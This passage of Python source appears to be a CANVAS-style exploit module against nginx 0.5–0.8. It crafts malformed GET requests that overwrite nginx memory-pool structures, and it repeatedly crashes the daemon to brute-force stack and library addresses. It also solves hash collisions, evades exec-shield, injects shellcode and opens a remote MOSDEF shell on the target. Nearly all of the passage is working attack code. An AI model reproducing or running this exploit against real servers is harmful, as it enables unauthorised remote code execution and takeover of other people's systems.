        # ngx_alloc() thus invoking the callback handler we corrupted.
        s += "Host: .\r\n\r\n"

        return s

    # Attack vector used to scan for the value of 'pool->current' in
    # nginx on versions 0.7 and 0.8.  This relies on the fact that
    # ngx_palloc() will crash out dereferencing log (which is -1) if
    # pool->d.end - pool < 0, and survive otherwise.
    def create_string_determine_current(self, end):
        s = ''
        s += 'GET /.%23./'
        # pool->d.last -- irrelevant
        s += "%00%00%00"
        # pool->d.end -- must trigger malloc() failure
        s += "%%%.2x" % ((end >>  0) & 0xFF)
        s += "%%%.2x" % ((end >>  8) & 0xFF)
        s += "%%%.2x" % ((end >> 16) & 0xFF)
        s += "%%%.2x" % ((end >> 24) & 0xFF)
        # pool->d.next
        s += "%00%00%00%00"
        # pool->d.failed
        s += "%00%00%00%00"
        # pool->d.max -- use 4k max per pool.
        s += "%00%10%00%00"
        # pool->current -- we point it to stack space, as this will contain
        # 0-bytes, to satisfy the conditions.
        s += "%%%.2x" % ((self.ctx_stack >>  0) & 0xFF)
        s += "%%%.2x" % ((self.ctx_stack >>  8) & 0xFF)
        s += "%%%.2x" % ((self.ctx_stack >> 16) & 0xFF)
        s += "%%%.2x" % ((self.ctx_stack >> 24) & 0xFF)
        # pool->chain
        s += "%00%00%00%00"
        # pool->large
        s += "%00%00%00%00"
        # pool->cleanup
        s += "%00%00%00%00"
        # pool->log -- crash out
        s += "%ff%ff%ff%ff"

        s += '#' + 'B' * (self.ctx_length - 9 * 12)
        s += ' HTTP/1.0\r\n'

        # Error out quickly if we do not dereference pool->log.
        s += "Host: .\r\n\r\n"

        return s

    def try_current(self, end):
        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            return -1

        self.log("Trying: 0x%.8x" % end)
        s = self.create_string_determine_current(end)

        try:
            self.sd.sendall(s)
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            return -1

        try:
            ret = self.sd.recv(4096)
            if not len(ret):
                self.log("CRASH")
                return False
        except:
            self.log("CRASH E")
            return False

        self.log("NO CRASH")
        return True

    def determine_current(self):
        foo = 0x08040000 # XXX

        # First we search with a 512 KiB granularity
        while self.try_current(foo) == False:
            self.log("0x%8x" % foo)
            foo += 512 * 1024

        foo -= 512 * 1024
        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        # Then we search with page granularity
        while self.try_current(foo) == False:
            self.log("0x%8x" % foo)
            foo += 4096

        # Finally we search with dword granularity
        foo -= 4096
        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        while self.try_current(foo) == False:
            self.log("0x%8x" % foo)
            foo += 4

        return foo

    def attack(self, type):
        if self.debug == True:
            self.log('[DEBUG] Halted for debug ... attach!')
            sys.stdin.read(1)

        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            return -1

        if type == JINX_ATTACK_STACK:
            s = self.create_attack_stack_string()
        else:
            s = self.create_attack_exec_shield_string()

        try:
            self.sd.sendall(s)
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            return -1

        try:
            ret = self.sd.recv(4)
            if not len(ret):
                return False
        except:
            return False

        if 'JINX' in ret:
            self.log('[!] Got trigger!')

            try:
                self.sd.sendall('JINX')
            except:
                self.sd.close()
                self.errno = JINX_ERROR_SEND
                return -1

            # start a mosdef shell
            node = linuxNode()
            node.parentnode = self.argsDict['passednodes'][0]
            shellServer = MosdefShellServer('Linux', 'i386')
            shellServer(self.sd, node)
            node.startup()
            self.setSucceeded()
            return node

        else:
            print 'XXX' + repr(ret)
            return False

    def attack_new(self, type):
        if self.debug == True:
            self.log('[DEBUG] Halted for debug ... attach!')
            sys.stdin.read(1)

        s = ''
        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            return -1

        s = ''
        s += 'GET /.%23./'
        # pool->d.last -- point to stack space we determined; offset 0x30
        last = (self.ctx_dso & 0xFFFFFF00) | 0x30;
        s += "%%%.2x" % ((last >>  8) & 0xFF)
        s += "%%%.2x" % ((last >> 16) & 0xFF)
        s += "%%%.2x" % ((last >> 24) & 0xFF)

        # pool->d.end
        end = last + 480 + 256 + 19 * 4 + 8 * 12 + 255
        s += "%%%.2x" % ((end >>  0) & 0xFF)
        s += "%%%.2x" % ((end >>  8) & 0xFF)
        s += "%%%.2x" % ((end >> 16) & 0xFF)
        s += "%%%.2x" % ((end >> 24) & 0xFF)

        # pool->d.next
        s += "%00%00%00%00"

        # pool->d.failed
        s += "%00%00%00%00"

        # pool->d.max -- use 4k max per pool.
        s += "%00%10%00%00"

        # pool->current
        s += "%%%.2x" % ((self.current >>  0) & 0xFF)
        s += "%%%.2x" % ((self.current >>  8) & 0xFF)
        s += "%%%.2x" % ((self.current >> 16) & 0xFF)
        s += "%%%.2x" % ((self.current >> 24) & 0xFF)

        # pool->chain
        s += "%00%00%00%00"
        # pool->large
        s += "%00%00%00%00"
        # pool->cleanup
        s += "%00%00%00%00"
        # pool->log; our fake overlapping ngx_log_s structure will now
        # reside at offset 0x4C on the stack page.
        fake_log = (self.ctx_dso & 0xFFFFFF00) | 0x3C;
        log_handler = fake_log + 36

        self.log('    [ ] Trying to find hash that collides to 0x%.8X' % log_handler)
        bh = BrakkeHash()
        for l in range(8, 32):
            rc,hash = bh.solve(log_handler, l)
            if rc == 0:
                self.log("    [+] H[%s] = 0x%.8X for length %d" % (hash, log_handler, l))
                break

        if rc == 2:
            self.log("    [-] Failed")
            return -1

        self.log('    [ ] Setting up 20 element ngx_table_elt_t array at: 0x%.8X' % last)
        self.log('    [ ] Overlapping ngx_log_t and ngx_table_elt_t at: 0x%.8X' % fake_log)
        s += "%%%.2x" % ((fake_log >>  0) & 0xFF)
        s += "%%%.2x" % ((fake_log >>  8) & 0xFF)
        s += "%%%.2x" % ((fake_log >> 16) & 0xFF)
        s += "%%%.2x" % ((fake_log >> 24) & 0xFF)

        s += '#' + 'B' * (self.ctx_length - 9 * 12)
        s += ' HTTP/1.0\r\n'

        # xorl: figure this out.
        s += 'AAAAAAAA:AAAAAAAA\r\n'
        s += hash + "\r\n"
        s += "btyazoyu\r\n"
        s += "ayhomxnc\r\n"
        s += "aaaaaaaaaaaboecgrth\r\n"
        s += "aaaaaaaaaaabeobgypr\r\n"
        s += "atplsyqo\r\n"
        s += "a" * 248 + "gnblisc:%s\r\n" % self.shellcode

        # The invalid Host header again.  This one will not fit in the page
        # we faked anymore, causing a call to ngx_log_error() through
        # ngx_alloc() thus invoking the callback handler we corrupted.
        s += "Host: .\r\n\r\n"

        try:
            self.sd.sendall(s)
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            return -1

        try:
            ret = self.sd.recv(4096)
            if not len(ret):
                return False
        except:
            return False

        if 'JINX' in ret:
            self.log('[!] Got trigger!')

            try:
                self.sd.sendall('JINX')
            except:
                self.log("ERROR ERROR")
                self.sd.close()
                self.errno = JINX_ERROR_SEND
                return -1

            # start a mosdef shell
            node = linuxNode()
            node.parentnode = self.argsDict['passednodes'][0]
            shellServer = MosdefShellServer('Linux', 'i386')
            shellServer(self.sd, node)
            node.startup()
            self.setSucceeded()
            return node

        else:
            print 'XXX' + repr(ret)
            return False


    def run(self):
        self.getArgs()
        if self.version == 0:
            return self.run_legacy()
        elif self.version == 1:
            return self.run_new()
        else:
            self.usage()

    def run_new(self):
        self.log('nginx exploit attacking: HOST: %s PORT: %s Execshield: %s' % (repr(self.host), repr(self.port),self.exec_shield))
        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        phase = 1
        self.log('[%d] Determining request length to align pool->last to 0x2f' % phase)
        if self.determine_length_new() == -1:
            self.log('    [!] %s' % self.strerror())
            return False
        phase += 1

        self.log('[%d] Scanning for stack from 0xbf700000 to 0xc0000000...' % phase)
        ret = self.scan_range(0xbf700000, 0xc0000000)
        if ret == -1:
            self.log('    [!] %s' % self.strerror())
            return False
        self.ctx_stack = ret
        self.log('    [+] Found first stack page at: 0x%.8X' % ret)

        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        phase += 1
        self.log('[%d] Scanning for W^X (hopefully) DSO pages from 0x01000000 to 0x00100000...' % phase)
        ret = self.scan_range(0x01000000, 0x00100000)
        if ret == -1:
            self.log('    [!] %s' % self.strerror())
            if self.errno == JINX_ERROR_SCAN:
                self.log('        Not all distributions map low DSO pages.  This mode is primarily'
                         ' for evading exec-shield.  You may want to run the exploit -O exec_shield:0')
            return False
        self.ctx_dso = ret
        self.log('     [+] Found DSO page at: 0x%.8X' % ret)

        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        self.current = self.determine_current()
        self.log('Current: 0x%.8x' % self.current)

        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        # Scanning for pages is a tad dodgy because when recv() on the nginx
        # server socket can return 0 without having a SIGSEGV although this
        # is uncommon.  For debugging purposes performing a multi-stage
        # attack is much easier, so we use the scanning code for that.
        self.log('[%d] Attacking W^X (hopefully) DSO pages from 0x%.8x to 0x%.8x...' % (phase, self.DSO_END, self.DSO_START))
        self.log('        Not all distributions map low DSO pages.  This mode is primarily'
                 ' for evading exec-shield.  You may want to run the exploit -O exec_shield:0')
        return self.attack_range(JINX_ATTACK_NEW_DSO, self.DSO_END, self.DSO_START)

    def run_legacy(self):
        """
        For 0.5 and 0.6.
        """
        self.log('nginx exploit attacking (legacy): HOST: %s PORT: %s Execshield: %s' % (repr(self.host), repr(self.port),self.exec_shield))
        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        phase = 1
        self.log('[%d] Determining request length to align pool->last to 0x2f' % phase)
        if self.determine_length() == -1:
            self.log('    [!] %s' % self.strerror())
            return False
        phase += 1

        # Scanning for pages is a tad dodgy because when recv() on the nginx
        # server socket can return 0 without having a SIGSEGV although this
        # is uncommon.  For debugging purposes performing a multi-stage
        # attack is much easier, so we use the scanning code for that.
        if self.debug == False:
            if self.exec_shield != 1:
                self.log('[%d] Attacking through stack from 0x%.8x to 0x%.8x...' % (phase, self.STACK_START, self.STACK_END))
                return self.attack_range(JINX_ATTACK_STACK, self.STACK_START, self.STACK_END)
            else:
                self.log('[%d] Attacking W^X (hopefully) DSO pages from 0x%.8x to 0x%.8x...' % (phase, self.DSO_END, self.DSO_START))
                self.log('        Not all distributions map low DSO pages.  This mode is primarily'
                         ' for evading exec-shield.  You may want to run the exploit -O exec_shield:0')
                return self.attack_range(JINX_ATTACK_DSO, self.DSO_END, self.DSO_START)

        # If self.debug is True we use scanning code to make debugging easier.
        if self.exec_shield != 1:
            self.log('[%d] Scanning for stack from 0x%.8x to 0x%.8x...' % (phase, self.STACK_START, self.STACK_END))
            ret = self.scan_range(self.STACK_START, self.STACK_END)
            if ret == -1:
                self.log('    [!] %s' % self.strerror())
                return False
            self.ctx_stack = ret
            self.log('    [+] Found first stack page at: 0x%.8X' % ret)
        else:
             phase += 1
             self.log('[%d] Scanning for W^X (hopefully) DSO pages from 0x%.8x to 0x%.8x...' % (phase, self.DSO_END, self.DSO_START))
             ret = self.scan_range(self.DSO_END, self.DSO_START)
             if ret == -1:
                 self.log('    [!] %s' % self.strerror())
                 if self.errno == JINX_ERROR_SCAN:
                     self.log('        Not all distributions map low DSO pages.  This mode is primarily'
                              ' for evading exec-shield.  You may want to run the exploit -O exec_shield:0')
                 return False
             self.ctx_dso = ret
             self.log('     [+] Found DSO page at: 0x%.8X' % ret)

        if self.crash_daemon() == -1:
            self.log('    [!] %s' % self.strerror())
            return False

        phase += 1
        self.log('[%d] Attacking Engine X to lop nukes at evil countries^W^W^W^W^W^Wfor fun and profit' % phase)
        if self.exec_shield == 1:
            self.log("Attempting to evade exec-shield")
            return self.attack(JINX_ATTACK_DSO)
        else:
            self.log("Not attempting to evade exec-shield")
            return self.attack(JINX_ATTACK_STACK)

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [True, False, None]:
        ret.interact()  
